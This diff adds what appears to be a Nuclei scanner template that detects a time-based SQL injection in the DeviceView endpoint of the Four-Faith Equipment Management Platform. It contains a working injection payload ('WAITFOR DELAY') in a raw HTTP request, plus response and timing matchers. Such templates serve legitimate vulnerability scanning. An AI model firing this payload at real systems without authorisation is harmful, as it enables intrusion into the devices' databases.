@@ -1,0 +1,35 @@
+id: poc-yaml-four-faith-equipment-management-platform-deviceview-sqli
+info:
+  name: Four-Faith Equipment Management Platform DeviceView SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(4, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "设备分组"
+          - "设备编码"
+          - "最近心跳时间"
+        part: body
+
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
